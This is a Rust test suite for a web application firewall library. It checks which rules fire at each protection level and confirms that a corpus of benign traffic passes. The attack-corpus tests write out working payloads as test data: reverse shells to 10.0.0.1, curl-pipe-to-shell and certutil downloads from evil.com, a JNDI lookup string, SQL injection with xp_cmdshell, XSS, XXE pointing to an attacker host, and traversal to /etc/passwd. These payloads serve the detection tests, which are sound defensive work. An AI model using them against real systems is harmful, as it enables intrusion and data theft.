//! Preset behaviour: level gating, attack corpus (asserting the rule id that
//! fires) and a benign corpus that must never be blocked.

mod common;

use common::MockRequest;
use mini_waf::ProtectionLevel::{
    self,
    Balanced,
    High,
    Low,
    Paranoid,
};
use mini_waf::{
    MiniWafInstance,
    QueryMap,
    QueryValue,
    UploadedFile,
    WafConfig,
    WafDecision,
    WafPresetName,
    create_mini_waf,
};

fn waf(presets: &[WafPresetName], level: ProtectionLevel) -> MiniWafInstance {
    create_mini_waf(
        WafConfig::default()
            .presets(presets.iter().copied())
            .level(level),
        None,
    )
}

fn default_at(level: ProtectionLevel) -> MiniWafInstance {
    waf(&[WafPresetName::Default], level)
}

/// `"decision:rule-id"`, so a failure names the offending rule.
fn verdict(waf: &MiniWafInstance, mut req: MockRequest) -> String {
    let result = waf.handle(&mut req);
    let decision = if result.decision == WafDecision::Block {
        "block"
    } else {
        "allow"
    };
    format!(
        "{decision}:{}",
        result
            .matched_rule
            .map(|rule| rule.id.as_str())
            .unwrap_or("")
    )
}

fn ids(waf: &MiniWafInstance) -> Vec<&str> {
    waf.rules().iter().map(|rule| rule.id.as_str()).collect()
}

mod levels {
    use super::*;

    #[test]
    fn defaults_to_balanced() {
        assert_eq!(
            create_mini_waf(
                WafConfig::default().presets([WafPresetName::Default]),
                None
            )
            .config()
            .level,
            Balanced
        );
    }

    #[test]
    fn low_excludes_higher_rules() {
        let engine = default_at(Low);
        let ids = ids(&engine);
        for id in [
            "preset-scanners-ua",
            "preset-path-traversal",
            "preset-sqli-classic-query",
            "preset-rce-unix-cmd",
            "preset-rce-ssrf-metadata",
            "preset-lfi-os-files",
        ] {
            assert!(ids.contains(&id), "{id}");
        }
        for id in [
            "preset-xss-query",
            "preset-ssi-injection",
            "preset-prototype-pollution",
            "preset-sqli-advanced-query",
            "preset-dangerous-upload",
            "preset-rce-ssti",
            "preset-protocol-response-splitting",
        ] {
            assert!(!ids.contains(&id), "{id}");
        }
    }

    #[test]
    fn balanced_includes_xss_but_not_high_rules() {
        let engine = default_at(Balanced);
        let ids = ids(&engine);
        for id in [
            "preset-xss-query",
            "preset-null-byte",
            "preset-dangerous-upload",
            "preset-protocol-response-splitting",
            "preset-rce-ssti",
            "preset-lfi-restricted-files",
        ] {
            assert!(ids.contains(&id), "{id}");
        }
        for id in [
            "preset-ssi-injection",
            "preset-prototype-pollution",
            "preset-xss-eval-alert",
            "preset-protocol-empty-ua",
        ] {
            assert!(!ids.contains(&id), "{id}");
        }
    }

    #[test]
    fn high_includes_aggressive_heuristics() {
        let engine = default_at(High);
        let ids = ids(&engine);
        for id in [
            "preset-ssi-injection",
            "preset-prototype-pollution",
            "preset-hex-flood",
            "preset-sqli-advanced-query",
            "preset-protocol-cl-te-conflict",
            "preset-rce-shell-expression",
        ] {
            assert!(ids.contains(&id), "{id}");
        }
        assert!(!ids.contains(&"preset-scanners-ua-broad"));
        assert!(!ids.contains(&"preset-protocol-empty-ua"));
    }

    #[test]
    fn paranoid_includes_legacy_rules() {
        let engine = default_at(Paranoid);
        let ids = ids(&engine);
        for id in [
            "preset-scanners-ua-broad",
            "preset-xss-generic-tags",
            "preset-xss-eval-alert",
            "preset-shebang",
            "preset-excessive-header",
            "preset-protocol-empty-ua",
        ] {
            assert!(ids.contains(&id), "{id}");
        }
    }

    #[test]
    fn the_same_payload_is_gated_by_level() {
        let ssi =
            || MockRequest::new().query("page", "<!--#exec cmd=\"id\"-->");
        assert_eq!(
            waf(&[WafPresetName::Xss], Low).handle(&mut ssi()).decision,
            WafDecision::Allow
        );
        assert_eq!(
            waf(&[WafPresetName::Xss], High).handle(&mut ssi()).decision,
            WafDecision::Block
        );
        let xss = || MockRequest::new().query("q", "<script>alert(1)</script>");
        assert_eq!(
            waf(&[WafPresetName::Xss], Low).handle(&mut xss()).decision,
            WafDecision::Allow
        );
        assert_eq!(
            waf(&[WafPresetName::Xss], Balanced)
                .handle(&mut xss())
                .decision,
            WafDecision::Block
        );
        let tautology = MockRequest::new().query("u", "admin' OR 'a'='a").ua();
        assert_eq!(verdict(&default_at(Low), tautology), "allow:");
    }
}

mod packs {
    use super::*;

    /// Preset, level, request and the rule id expected to fire.
    type Case = (WafPresetName, ProtectionLevel, MockRequest, &'static str);

    #[test]
    fn single_pack_hits() {
        let cases: Vec<Case> = vec![
            (
                WafPresetName::Xss,
                Balanced,
                MockRequest::new().query("q", "<script>alert(1)</script>"),
                "preset-xss-query",
            ),
            (
                WafPresetName::Sqli,
                Balanced,
                MockRequest::new()
                    .query("id", "1 UNION SELECT password FROM users"),
                "preset-sqli-classic-query",
            ),
            (
                WafPresetName::Sqli,
                High,
                MockRequest::new().query("id", "1'; WAITFOR DELAY '0:0:5'"),
                "preset-sqli-advanced-query",
            ),
            (
                WafPresetName::Scanners,
                Balanced,
                MockRequest::new().header("user-agent", "sqlmap/1.7"),
                "preset-scanners-ua",
            ),
            (
                WafPresetName::Scanners,
                High,
                MockRequest::new().body(r#"{"__proto__":{"admin":true}}"#),
                "preset-prototype-pollution",
            ),
            (
                WafPresetName::Rfi,
                Balanced,
                MockRequest::new()
                    .query("cmd", "eval(base64_decode(\"YQ==\"))"),
                "preset-rce-php",
            ),
            (
                WafPresetName::Rfi,
                Balanced,
                MockRequest::new().file(UploadedFile {
                    originalname: Some("shell.php".into()),
                    ..UploadedFile::default()
                }),
                "preset-dangerous-upload",
            ),
            (
                WafPresetName::Rce,
                Balanced,
                MockRequest::new().query("cmd", "; cat /etc/passwd"),
                "preset-rce-unix-cmd",
            ),
            (
                WafPresetName::Rce,
                Balanced,
                MockRequest::new()
                    .query("url", "http://169.254.169.254/latest/meta-data/"),
                "preset-rce-ssrf-metadata",
            ),
            (
                WafPresetName::Rce,
                Balanced,
                MockRequest::new().query("tpl", "{{7*7}}"),
                "preset-rce-ssti",
            ),
            (
                WafPresetName::Protocol,
                Balanced,
                MockRequest::new().query("q", "x\r\nSet-Cookie: session=evil"),
                "preset-protocol-response-splitting",
            ),
            (
                WafPresetName::Protocol,
                High,
                MockRequest::new()
                    .ua()
                    .header("content-length", "10")
                    .header("transfer-encoding", "chunked"),
                "preset-protocol-cl-te-conflict",
            ),
            (
                WafPresetName::Protocol,
                High,
                MockRequest::new().ua().header("host", "127.0.0.1:3000"),
                "preset-protocol-host-ip",
            ),
            (
                WafPresetName::Protocol,
                High,
                MockRequest::new().ua().header("host", "[2001:db8::1]:443"),
                "preset-protocol-host-ip",
            ),
            (
                WafPresetName::PathTraversal,
                Balanced,
                MockRequest::new().query("file", "/etc/passwd"),
                "preset-lfi-os-files",
            ),
        ];
        for (pack, level, req, expected) in cases {
            assert_eq!(
                verdict(&waf(&[pack], level), req),
                format!("block:{expected}"),
                "{pack} at {level}"
            );
        }
    }

    #[test]
    fn allows_benign_traffic_on_default() {
        let req = MockRequest::new()
            .path("/api/users")
            .query("page", "1")
            .ua();
        assert_eq!(verdict(&default_at(Balanced), req), "allow:");
    }

    #[test]
    fn nested_query_values_reach_the_rules() {
        let nested: QueryMap =
            [("q", QueryValue::from("<script>alert(1)</script>"))].into();
        let req = MockRequest::new().query("filter", nested).ua();
        assert_eq!(
            default_at(High).handle(&mut { req }).decision,
            WafDecision::Block
        );
    }
}

/// Traffic production apps genuinely send. Every entry must survive the
/// `default` preset at `high`: a false positive is what gets a WAF turned off.
mod benign_corpus {
    use super::*;

    fn nested(pairs: &[(&str, &str)]) -> QueryValue {
        QueryValue::Object(
            pairs
                .iter()
                .map(|(k, v)| (*k, QueryValue::from(*v)))
                .collect(),
        )
    }

    #[test]
    fn benign_queries() {
        let queries: Vec<(&str, &str, QueryValue)> = vec![
            (
                "oauth redirect",
                "redirect_uri",
                "https://app.example.com/callback?state=abc".into(),
            ),
            (
                "cdn asset",
                "avatar",
                "https://cdn.example.com/u/42.png".into(),
            ),
            (
                "webhook url",
                "url",
                "https://hooks.example.com/services/T0/B0/XYZ".into(),
            ),
            ("jsonapi include", "include", "author,comments".into()),
            ("bare include word", "include", "include".into()),
            ("pipe-delimited tags", "tags", "rails|php|node|curl".into()),
            ("semicolon list", "ids", "a;b;c".into()),
            ("apostrophe text", "q", "O'Brien and sons".into()),
            ("sort params", "sort", "created_at".into()),
            ("price template", "label", "Total: ${amount}".into()),
            ("icu message", "msg", "Hello ${name}, welcome".into()),
            (
                "backtick markdown",
                "body",
                "Use `npm install` and then run it".into(),
            ),
            ("email", "email", "user+tag@example.com".into()),
            ("iso timestamp", "from", "2026-09-19T12:00:00Z".into()),
            ("uuid", "id", "c0704270-816a-4309-b84d-424684c85f0f".into()),
            ("encoded version", "v", "1%2e2%2e3".into()),
            ("hex color", "theme", "#ff00aa".into()),
            (
                "png data uri",
                "src",
                "data:image/png;base64,iVBORw0KGgo=".into(),
            ),
            ("pagination", "per_page", "50".into()),
            ("bounding box", "bbox", "-3.7,-38.5,-3.6,-38.4".into()),
            (
                "nested filter",
                "filter",
                nested(&[("status", "open"), ("owner", "ana")]),
            ),
            (
                "array param",
                "tag",
                QueryValue::Array(vec!["node".into(), "waf".into()]),
            ),
            ("equality prose", "eq", "a = b and c = d".into()),
            ("boolean prose", "q", "shipped and paid".into()),
            ("currency prose", "desc", "cost is $5 or $10 today".into()),
            (
                "parenthesised prose",
                "note",
                "see section (a) and (b) below".into(),
            ),
            (
                "json word prose",
                "note",
                "the json response includes the user list".into(),
            ),
            ("pascal assignment", "code", "counter := counter + 1".into()),
            (
                "semver assignment",
                "v",
                "bumped app 1.2.3 := latest tag".into(),
            ),
            (
                "mongo word prose",
                "q",
                "update the db with the new records".into(),
            ),
            (
                "freemarker-free markup",
                "html",
                "use <b>bold</b> and #hashtags here".into(),
            ),
            (
                "windows forward path",
                "note",
                "saved to C:/Users/me/report.pdf".into(),
            ),
            (
                "optional chaining prose",
                "note",
                "read document?.title and alert. (later) if set".into(),
            ),
            (
                "eval word prose",
                "q",
                "we will eval. the results tomorrow".into(),
            ),
            (
                "new date prose",
                "code",
                "const now = new Date(); render(now)".into(),
            ),
            (
                "while loop prose",
                "note",
                "I read a book while commuting to work".into(),
            ),
            (
                "fetch prose newline",
                "note",
                "first line\nplease fetch the file soon".into(),
            ),
            (
                "quit prose newline",
                "note",
                "take a break\nquit the app when you are done".into(),
            ),
            (
                "capability prose newline",
                "note",
                "the platform\nhas strong capability today".into(),
            ),
        ];
        let engine = default_at(High);
        for (label, name, value) in queries {
            let req = MockRequest::new()
                .path("/api/items")
                .query(name, value)
                .ua();
            assert_eq!(verdict(&engine, req), "allow:", "{label}");
        }
    }

    #[test]
    fn benign_bodies() {
        let bodies = [
            ("json schema", r#"{"required":["email"],"include":true}"#),
            (
                "validation message",
                r#"{"error":"This field is required"}"#,
            ),
            ("user prose", r#"{"bio":"I include my cat in every photo"}"#),
            (
                "nested payload",
                r#"{"user":{"name":"Ana","roles":["admin","editor"]}}"#,
            ),
            (
                "icu template",
                r#"{"greeting":"Hi ${firstName}! You have {count} messages"}"#,
            ),
            (
                "sql-adjacent prose",
                r#"{"title":"How to speed up a query"}"#,
            ),
            (
                "markdown post",
                concat!(
                    r##"{"md":"# Title\n\nSome **bold** text "##,
                    r#"and a [link](https://x.com)"}"#,
                ),
            ),
            (
                "csv metadata",
                r#"{"columns":["id","name","email"],"delimiter":";"}"#,
            ),
            (
                "plain html doctype",
                "<!DOCTYPE html><html><body><h1>Hi</h1></body></html>",
            ),
            (
                "legacy-compat doctype",
                r#"<!DOCTYPE html SYSTEM "about:legacy-compat"><html></html>"#,
            ),
            (
                "safe yaml prose",
                r#"{"config":"logging: info\nretries: 3"}"#,
            ),
            (
                "python word prose",
                r#"{"bio":"I write python and ruby for a living"}"#,
            ),
            (
                "long code comment",
                concat!(
                    r#"{"code":"const total = price "#,
                    r#"/* running subtotal for the cart */ + tax"}"#,
                ),
            ),
        ];
        let engine = default_at(High);
        for (label, body) in bodies {
            let req = MockRequest::new()
                .path("/api/items")
                .method("POST")
                .body(body)
                .ua();
            assert_eq!(verdict(&engine, req), "allow:", "{label}");
        }
    }

    #[test]
    fn benign_paths() {
        let paths = [
            "/api/v1/users/42",
            "/assets/app.2f3a9b.css",
            "/blog/how-to-use-node.js",
            "/docs/guide/quick-start.html",
            "/v2.1/reports/monthly",
            "/docs/api/window.location.html",
            "/blog/how-we-cut-db.users.find-latency",
            "/help/keyboard-alert-and-prompt-shortcuts",
            "/api/v1/reports/2024%2Fq1%2Fsummary%20final.pdf",
            "/assets/550e8400e29b41d4a716446655440000/logo.png",
        ];
        let engine = default_at(High);
        for path in paths {
            assert_eq!(
                verdict(&engine, MockRequest::new().path(path).ua()),
                "allow:",
                "{path}"
            );
        }
    }

    #[test]
    fn benign_uploads() {
        let engine = default_at(High);
        for name in [
            "invoice.pdf",
            "photo.jpeg",
            "report.2026.xlsx",
            "archive.tar.gz",
        ] {
            let req = MockRequest::new()
                .path("/upload")
                .method("POST")
                .ua()
                .file(UploadedFile::named(name));
            assert_eq!(verdict(&engine, req), "allow:", "{name}");
        }
    }

    #[test]
    fn paranoid_lookalikes() {
        let queries = [
            ("loop prose", "q", "for the win while we wait for results"),
            (
                "mail-from prose",
                "note",
                "grab your mail from the front desk",
            ),
            (
                "external webhook",
                "url",
                "https://hooks.example.com/services/abc",
            ),
            (
                "quoted concat prose",
                "code",
                "label = \"x\" & \"y\" & \"z\"",
            ),
            ("ampersand list", "tags", "node&waf&test"),
            (
                "graphql typename",
                "query",
                "query{__typename user{id name}}",
            ),
            (
                "gopher word prose",
                "note",
                "the gopher digs tunnels underground",
            ),
            ("public ip url", "cb", "http://93.184.216.34/callback"),
            (
                "declare winner prose",
                "note",
                "I hereby declare this project the winner",
            ),
            (
                "declare variable prose",
                "doc",
                "please declare a variable named total",
            ),
            (
                "set reminder prose",
                "q",
                "can you set a reminder for tomorrow",
            ),
            (
                "set appearance path prose",
                "note",
                "go to set /appearance in the menu",
            ),
        ];
        let engine = default_at(Paranoid);
        for (label, name, value) in queries {
            let req = MockRequest::new()
                .path("/api/items")
                .query(name, value)
                .ua();
            assert_eq!(verdict(&engine, req), "allow:", "{label}");
        }
    }

    #[test]
    fn benign_encoded_values_at_high() {
        let engine = default_at(High);
        for (label, value) in [
            (
                "dashless uuid",
                "550e8400e29b41d4a716446655440000".to_owned(),
            ),
            (
                "jwt",
                "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.Zm9vYmFy"
                    .to_owned(),
            ),
            (
                "base64 prose",
                common::b64("the quarterly report is attached to this thread"),
            ),
            (
                "base64 email body",
                common::b64("Hi team, thanks for the quick turnaround today!"),
            ),
            (
                "opaque session token",
                common::b64("sid=8f3a2b1c9d0e4f5a6b7c8d9e0f1a2b3c"),
            ),
            (
                "benign base64 prose",
                common::b64("the quick brown fox jumps over the lazy dog"),
            ),
        ] {
            assert_eq!(
                verdict(&engine, MockRequest::new().query("v", value)),
                "allow:",
                "{label}"
            );
        }
    }
}

mod attack_corpus {
    use super::*;

    fn assert_blocks(
        level: ProtectionLevel,
        req: MockRequest,
        rule: &str,
        label: &str,
    ) {
        assert_eq!(
            verdict(&default_at(level), req),
            format!("block:{rule}"),
            "{label} at {level}"
        );
    }

    #[test]
    fn attack_queries() {
        let cases: Vec<(&str, ProtectionLevel, &str, QueryValue, &str)> = vec![
            (
                "sqli union",
                Low,
                "id",
                "1' UNION SELECT password FROM users--".into(),
                "preset-sqli-classic-query",
            ),
            (
                "sqli load_file",
                Low,
                "id",
                "1 AND load_file('/etc/passwd')".into(),
                "preset-sqli-dbms-primitives",
            ),
            (
                "sqli into outfile",
                Low,
                "id",
                "1 INTO OUTFILE '/var/www/s.php'".into(),
                "preset-sqli-dbms-primitives",
            ),
            (
                "sqli xp_cmdshell",
                Low,
                "id",
                "1; EXEC xp_cmdshell('dir')".into(),
                "preset-sqli-dbms-primitives",
            ),
            (
                "sqli versioned comment",
                Low,
                "id",
                "1/*!50000UNION*/SELECT 1".into(),
                "preset-sqli-versioned-comment",
            ),
            (
                "sqli versioned comment encoded",
                Low,
                "id",
                "1/*%21SELECT 1".into(),
                "preset-sqli-versioned-comment",
            ),
            (
                "sqli string tautology",
                Balanced,
                "u",
                "admin' OR 'a'='a".into(),
                "preset-sqli-tautology",
            ),
            (
                "sqli paren tautology",
                Balanced,
                "u",
                "x') OR ('1'='1".into(),
                "preset-sqli-tautology",
            ),
            (
                "sqli select from",
                Balanced,
                "f",
                "SELECT name FROM customers".into(),
                "preset-sqli-select-from",
            ),
            (
                "nosql operator (bracketed)",
                Balanced,
                "user",
                QueryValue::Object([("$ne", QueryValue::from("null"))].into()),
                "preset-sqli-nosql-operator",
            ),
            (
                "nosql unquoted operator",
                Balanced,
                "user",
                "{ $gt: \"\" }".into(),
                "preset-sqli-nosql-string",
            ),
            (
                "nosql unquoted $where",
                Balanced,
                "q",
                "x, $where: \"1\"".into(),
                "preset-sqli-nosql-string",
            ),
            (
                "sqli boolean equality (AND)",
                High,
                "id",
                "1 AND 6522=6522".into(),
                "preset-sqli-boolean-equality",
            ),
            (
                "sqli boolean equality (paren)",
                High,
                "id",
                "123) AND 12=12".into(),
                "preset-sqli-boolean-equality",
            ),
            (
                "sqli compact subquery",
                High,
                "q",
                "(select(1)from(users))".into(),
                "preset-sqli-compact-subquery",
            ),
            (
                "sqli json_extract",
                High,
                "id",
                "json_extract(data,0x22)".into(),
                "preset-sqli-json-functions",
            ),
            (
                "nosql driver api",
                High,
                "q",
                "db.users.find({})".into(),
                "preset-sqli-nosql-driver-api",
            ),
            (
                "nosql timing dos",
                High,
                "q",
                "0;var d=new Date(); do{c=new Date();}while(c-d<10000)".into(),
                "preset-sqli-nosql-time-dos",
            ),
            (
                "ldap matching rule",
                High,
                "u",
                "cn:1.2.840.113556.1.4.803:=2".into(),
                "preset-ldap-matching-rule",
            ),
            (
                "xss indirect call",
                High,
                "q",
                "(alert)(1)".into(),
                "preset-xss-indirect-call",
            ),
            (
                "mail RCPT TO injection",
                High,
                "email",
                "a@b.com\r\nRCPT TO: victim@x".into(),
                "preset-protocol-mail-command",
            ),
            (
                "imap capability injection",
                High,
                "q",
                "\r\nV100 CAPABILITY\r\nV101 FETCH 4791".into(),
                "preset-protocol-imap-command",
            ),
            (
                "mail quit teardown",
                High,
                "q",
                "\r\nQUIT\r\n".into(),
                "preset-protocol-mail-teardown",
            ),
            (
                "unc share path",
                High,
                "file",
                "\\\\10.0.0.1\\c$\\windows".into(),
                "preset-lfi-unc-path",
            ),
            (
                "sqli order by",
                High,
                "sort",
                "1 ORDER BY 9--".into(),
                "preset-sqli-blind",
            ),
            (
                "sqli case when",
                High,
                "id",
                "1 CASE WHEN (1=1) THEN 1 ELSE 0 END".into(),
                "preset-sqli-blind",
            ),
            (
                "sqli char chain",
                High,
                "id",
                "CHAR(104,101,108,108,111)".into(),
                "preset-sqli-blind",
            ),
            (
                "sqli comment close",
                High,
                "u",
                "admin'-- ".into(),
                "preset-sqli-blind",
            ),
            (
                "xss script tag",
                Balanced,
                "q",
                "<script>alert(1)</script>".into(),
                "preset-xss-query",
            ),
            (
                "xss percent-encoded",
                Balanced,
                "q",
                "%3Cscript%3Ealert(1)".into(),
                "preset-xss-encoded-tag",
            ),
            (
                "xss entity-encoded",
                Balanced,
                "q",
                "&lt;script&gt;alert(1)".into(),
                "preset-xss-encoded-tag",
            ),
            (
                "xss data:text/html",
                Balanced,
                "next",
                "data:text/html,<x>".into(),
                "preset-xss-dangerous-uri",
            ),
            (
                "xss srcdoc",
                Balanced,
                "html",
                "<iframe srcdoc=\"&lt;x\">".into(),
                "preset-xss-attribute-vector",
            ),
            (
                "xss formaction",
                Balanced,
                "html",
                "<button formaction=x>".into(),
                "preset-xss-attribute-vector",
            ),
            (
                "xss fromCharCode",
                High,
                "q",
                "String.fromCharCode(88,83,83)".into(),
                "preset-xss-js-primitives",
            ),
            (
                "xss optional chaining",
                Balanced,
                "q",
                "alert?.(document?.cookie)".into(),
                "preset-xss-query",
            ),
            (
                "xss breakout to sink",
                High,
                "q",
                "'-alert(1)//".into(),
                "preset-xss-breakout-call",
            ),
            (
                "rce jndi",
                Low,
                "q",
                "${jndi:ldap://evil.com/a}".into(),
                "preset-rce-jndi",
            ),
            (
                "rce jndi nested",
                Low,
                "q",
                "${${lower:j}ndi:ldap://x}".into(),
                "preset-rce-jndi",
            ),
            (
                "rce /dev/tcp shell",
                Low,
                "c",
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".into(),
                "preset-rce-reverse-shell",
            ),
            (
                "rce nc -e",
                Low,
                "c",
                "nc -e /bin/sh 10.0.0.1 4444".into(),
                "preset-rce-reverse-shell",
            ),
            (
                "rce curl pipe sh",
                Low,
                "c",
                "curl http://evil.com/x.sh | sh".into(),
                "preset-rce-download-exec",
            ),
            (
                "rce python -c",
                Low,
                "c",
                "python -c \"import os\"".into(),
                "preset-rce-download-exec",
            ),
            (
                "rce certutil",
                Low,
                "c",
                "certutil.exe -urlcache -f http://evil/x.exe".into(),
                "preset-rce-windows-lolbin",
            ),
            (
                "rce semicolon cat",
                Low,
                "cmd",
                "; cat config.yml".into(),
                "preset-rce-unix-cmd",
            ),
            (
                "rce backtick",
                Low,
                "cmd",
                "`whoami`".into(),
                "preset-rce-unix-cmd",
            ),
            (
                "rce pipe with argument",
                Low,
                "cmd",
                "x | curl http://evil.com".into(),
                "preset-rce-unix-cmd",
            ),
            (
                "rce os.system",
                Balanced,
                "c",
                "os.system(\"id\")".into(),
                "preset-rce-lang-exec",
            ),
            (
                "rce java exec",
                Balanced,
                "c",
                "Runtime.getRuntime().exec(\"id\")".into(),
                "preset-rce-lang-exec",
            ),
            (
                "rce java serialized",
                Balanced,
                "c",
                "rO0ABXNyABFqYXZh".into(),
                "preset-rce-deserialization",
            ),
            (
                "rce php serialized",
                Balanced,
                "c",
                "O:8:\"Exploit\":1:{s:3:\"cmd\";}".into(),
                "preset-rce-deserialization",
            ),
            (
                "rce ${IFS}",
                High,
                "c",
                "echo${IFS}hello".into(),
                "preset-rce-shell-expression",
            ),
            (
                "rfi php://filter",
                Low,
                "page",
                "php://filter/convert.base64-encode/resource=x".into(),
                "preset-rfi",
            ),
            (
                "rfi data wrapper",
                Low,
                "page",
                "data://text/plain;base64,PD9waHA=".into(),
                "preset-rfi",
            ),
            (
                "rfi expect wrapper",
                Low,
                "page",
                "expect://id".into(),
                "preset-rfi",
            ),
            (
                "rfi phar wrapper",
                Low,
                "page",
                "phar://evil.phar/x".into(),
                "preset-rfi",
            ),
            (
                "rfi php superglobal",
                Low,
                "c",
                "$_GET[cmd]".into(),
                "preset-rce-php",
            ),
            (
                "rfi remote script",
                Balanced,
                "page",
                "https://evil.com/shell.php".into(),
                "preset-rfi-remote-url",
            ),
            (
                "rfi trailing question mark",
                Balanced,
                "page",
                "http://evil.com/shell?".into(),
                "preset-rfi-remote-url",
            ),
            (
                "rfi include syntax",
                Balanced,
                "c",
                "include('http://evil/x')".into(),
                "preset-rfi-include-syntax",
            ),
            (
                "nosql timebomb while",
                Paranoid,
                "q",
                "x;while(true){}".into(),
                "preset-sqli-nosql-timebomb",
            ),
            (
                "ssrf loopback url",
                Paranoid,
                "callback",
                "http://127.0.0.1/admin".into(),
                "preset-ssrf-internal",
            ),
            (
                "ssrf rfc1918 gopher",
                Paranoid,
                "u",
                "gopher://10.0.0.5:6379/_INFO".into(),
                "preset-ssrf-internal",
            ),
            (
                "asp string concat",
                Paranoid,
                "c",
                "Ex\"&\"e\"&\"cute".into(),
                "preset-rce-asp-concat",
            ),
            (
                "graphql introspection",
                Paranoid,
                "query",
                "query{__schema{types{name}}}".into(),
                "preset-graphql-introspection",
            ),
            (
                "mail verb no crlf",
                Paranoid,
                "msg",
                "RCPT TO: victim@x.com".into(),
                "preset-protocol-mail-verb",
            ),
            (
                "mssql declare typed var",
                Paranoid,
                "id",
                "x DECLARE @c varchar(255)".into(),
                "preset-sqli-mssql-declare",
            ),
            (
                "windows set arithmetic",
                Paranoid,
                "c",
                "| set /a 3482*7301".into(),
                "preset-rce-windows-cmd-set",
            ),
        ];
        for (label, level, name, value, rule) in cases {
            assert_blocks(
                level,
                MockRequest::new()
                    .path("/api/items")
                    .query(name, value)
                    .ua(),
                rule,
                label,
            );
        }
    }

    #[test]
    fn attack_paths() {
        let blocked_anywhere = [
            ("traversal plain", "/files/../../etc/passwd"),
            (
                "traversal percent-encoded",
                "/files/%2e%2e%2f%2e%2e%2fetc/passwd",
            ),
            ("traversal double-encoded", "/files/%252e%252e%252f"),
            ("traversal overlong utf-8", "/files/..%c0%af..%c0%afetc"),
            ("traversal mixed encoding", "/files/.%2e/.%2e/etc"),
        ];
        for (label, path) in blocked_anywhere {
            assert!(
                default_at(Low)
                    .handle(&mut MockRequest::new().path(path).ua())
                    .decision
                    == WafDecision::Block,
                "{label}"
            );
        }
        let cases = [
            (
                "xss encoded tag in path",
                Balanced,
                "/view/%3Cscript%3Ealert",
                "preset-xss-encoded-tag",
            ),
            (
                "xss javascript uri in path",
                Balanced,
                "/go/javascript:alert(1)",
                "preset-xss-path",
            ),
            (
                "ssi exec in path",
                High,
                "/tpl/<!--#exec cmd=\"id\"-->",
                "preset-ssi-injection",
            ),
            ("unix cmd in path", Low, "/run/;id ", "preset-rce-unix-cmd"),
            (
                "crlf encoded in path",
                Balanced,
                "/redir%0d%0aSet-Cookie:x=1",
                "preset-protocol-crlf-encoded-path",
            ),
            (
                "crlf double-encoded in path",
                Balanced,
                "/redir%250d%250aSet-Cookie",
                "preset-protocol-crlf-double-encoded",
            ),
            (
                "ldap filter in path",
                High,
                "/dir/(uid=*)",
                "preset-ldap-filter",
            ),
            (
                "xss indirect call in path",
                High,
                "/view/(alert)(1)",
                "preset-xss-indirect-call",
            ),
            (
                "xss breakout call in path",
                High,
                "/go/'-alert(1)//",
                "preset-xss-breakout-call",
            ),
            (
                "nosql driver api in path",
                High,
                "/api/db.users.find({})",
                "preset-sqli-nosql-driver-api",
            ),
            (
                "traversal overlong 4-byte",
                Low,
                "/files/%f0%80%80%afboot",
                "preset-path-traversal-encoded",
            ),
            (
                "crlf per-char encoded",
                Balanced,
                "/x%25%30%41Set-cookie:crlf=1",
                "preset-protocol-crlf-double-encoded",
            ),
        ];
        for (label, level, path, rule) in cases {
            assert_blocks(
                level,
                MockRequest::new().path(path).ua(),
                rule,
                label,
            );
        }
    }

    #[test]
    fn attack_bodies() {
        let cases = [
            (
                "freemarker assign",
                Balanced,
                r#"<#assign ex="freemarker.template.utility.Execute"?new()>"#,
                "preset-rce-freemarker",
            ),
            (
                "yaml python deserialize",
                Balanced,
                r#"!!python/object/apply:os.system ["id"]"#,
                "preset-rce-yaml-deserialization",
            ),
            (
                "xxe external entity",
                High,
                r#"<!DOCTYPE t [<!ENTITY x SYSTEM "http://attacker/evil">]>"#,
                "preset-xxe-doctype",
            ),
            (
                "xxe doctype external dtd",
                High,
                r#"<!DOCTYPE x SYSTEM "//attacker/x"><x>a</x>"#,
                "preset-xxe-doctype",
            ),
        ];
        for (label, level, body, rule) in cases {
            assert_blocks(
                level,
                MockRequest::new()
                    .path("/api")
                    .method("POST")
                    .body(body)
                    .ua(),
                rule,
                label,
            );
        }
    }

    /// JavaScript's `\s` matches NBSP, the `U+2000` spaces, `U+3000`, … even
    /// without the `u` flag, so these separators must not slip past a rule.
    /// Verdicts taken from the TypeScript implementation.
    #[test]
    fn unicode_whitespace_separators() {
        let queries = [
            (
                "id",
                "1' UNION\u{A0}SELECT password FROM users--",
                "preset-sqli-classic-query",
            ),
            (
                "id",
                "1'\u{3000}UNION\u{2003}SELECT\u{A0}password FROM users",
                "preset-sqli-classic-query",
            ),
            ("u", "admin'\u{A0}OR\u{A0}'a'='a", "preset-sqli-tautology"),
            ("q", "<script\u{A0}src=//x>", "preset-xss-query"),
            (
                "q",
                "<img\u{A0}src=x\u{A0}onerror=alert(1)>",
                "preset-xss-query",
            ),
            ("q", "javascript\u{A0}:alert(1)", "preset-xss-query"),
            ("cmd", ";\u{A0}cat\u{A0}/etc/passwd", "preset-lfi-os-files"),
        ];
        for (name, value, rule) in queries {
            assert_blocks(
                Balanced,
                MockRequest::new().path("/x").query(name, value).ua(),
                rule,
                value,
            );
        }
        let xxe =
            "<!DOCTYPE\u{A0}x\u{A0}SYSTEM\u{A0}\"http://attacker/x\"><x/>";
        assert_blocks(
            High,
            MockRequest::new().path("/x").method("POST").body(xxe).ua(),
            "preset-xxe-doctype",
            xxe,
        );
        for value in ["café com leite", "preço\u{A0}R$\u{A0}10"] {
            let req = MockRequest::new().path("/x").query("q", value).ua();
            assert_eq!(
                verdict(&default_at(Balanced), req),
                "allow:",
                "{value}"
            );
        }
    }

    #[test]
    fn dangerous_uploads() {
        let engine = default_at(Balanced);
        for name in [
            "shell.php",
            "shell.phtml",
            "backdoor.jsp",
            "payload.ps1",
            "shell.php.jpg",
            "shell.asp.png",
        ] {
            let req = MockRequest::new()
                .path("/upload")
                .method("POST")
                .ua()
                .file(UploadedFile::named(name));
            assert!(
                engine.handle(&mut { req }).decision == WafDecision::Block,
                "{name}"
            );
        }
    }
}
